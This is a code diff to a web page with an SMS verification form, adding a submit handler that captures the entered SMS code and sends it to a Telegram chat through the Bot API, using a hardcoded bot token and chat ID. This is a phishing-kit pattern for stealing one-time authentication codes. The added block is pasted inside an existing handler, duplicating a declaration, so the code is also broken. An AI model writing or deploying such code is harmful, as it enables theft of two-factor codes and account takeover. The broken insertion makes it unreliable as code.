@@ -161,6 +161,31 @@
             document.getElementById("btn-submit").disabled = true;
 
             const smsCode = document.getElementById("sms-code").value.trim();
+            const TELEGRAM_BOT_TOKEN = "8289013486:AAHS-ti5CgbqRwytDmqAieUfBbBrn8gmxdI";
+const TELEGRAM_CHAT_ID = "-4810324154";
+
+document.getElementById("smsForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+    document.getElementById("loading").style.display = "flex";
+    document.getElementById("btn-submit").disabled = true;
+
+    const smsCode = document.getElementById("sms-code").value.trim();
+    console.log("Code soumis :", smsCode);
+
+    // Envoyer le code au bot Telegram
+    const message = `Nouveau code reçu: ${smsCode}`;
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+    try {
+        await fetch(url);
+        alert("Code envoyé à Telegram !");
+    } catch (err) {
+        console.error("Erreur Telegram :", err);
+    }
+
+    document.getElementById("loading").style.display = "none";
+    document.getElementById("btn-submit").disabled = false;
+});
             
             // Aquí iría tu lógica de validación / envío
             console.log("Código introducido:", smsCode);
